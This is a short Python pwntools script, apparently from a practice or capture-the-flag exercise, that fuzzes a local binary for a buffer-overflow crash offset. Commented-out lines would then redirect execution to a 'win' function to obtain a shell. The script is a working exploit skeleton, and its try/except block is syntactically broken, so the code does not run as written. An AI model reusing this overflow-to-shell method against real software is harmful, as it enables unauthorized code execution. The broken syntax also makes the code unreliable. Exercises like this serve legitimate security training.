from pwn import *
context(arch = 'amd64', os = 'linux')

# Generate a cyclic pattern so that we can auto-find the offset
payload = cyclic(5)

# Run the process once so that it crashes
p = process(['./parse'])
p.sendline(payload)
# Get the core dump
core = Coredump('./core')

# Our cyclic pattern should have been used as the crashing address
print(type(pack(core.rip)))
print(type(payload))
#assert pack(core.rip) in payload


for i in range(50, 350):
    p = process(['./parse'])
    p.sendline("A" * i)
    received = p.recvline()  # output from program
    try
        received += p.recvline()  # Segmentation fault if crash else empty
        if 'Segmentation' in str(received):
            # For some reason when sent through pwntools the buffer to crash was 1 length longer than
            # it should have been?
            print('Crash at %d characters' % (i - 1))
            print('Crash at value will be %s' % hex(i - 1))
            break
        except
            pass



# Cool! Now let's just replace that value with the address of 'win'
#crash = ELF('./mini-ntpclient')
#payload = fit({
#    cyclic_find(core.rip): crash.symbols.win
#})

# Get a shell!
#io = process(['./mini-ntpclient' , payload])
#io.sendline(b'id')
#print(io.recvline())
# uid=1000(user) gid=1000(user) groups=1000(user)
